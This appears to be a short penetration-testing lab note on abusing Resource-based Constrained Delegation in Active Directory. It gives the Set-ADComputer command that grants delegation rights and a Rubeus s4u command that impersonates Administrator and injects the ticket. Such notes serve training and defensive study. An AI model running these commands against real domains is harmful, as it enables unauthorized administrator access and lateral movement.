# RBCD

Resource-based Constrained Delegation (RBCD).



We identified that a user we control has `GenericWrite` on a machine account.

```powershell
> Set-ADComputer -Identity us-helpdesk -PrincipalsAllowedToDelegateToAccount 'student35$' -Verbose
```

Now, machine `student35` is allowed to delegate to the machine `us-helpdesk`.

Request a service ticket as machine `student35` but impersonate `Administrator` account via [s4u.md](s4u.md "mention"):

```powershell
> Rubeus.exe s4u /user:student35$ /aes256:<key> /msdsspn:http/us-helpdesk /impersonateuser:administrator /ptt
```

Then we can connect with [#winrs](../misc/ad-authentication.md#winrs "mention") or other ways. It is also possible to request a ticket for multiple services such as CIFS.
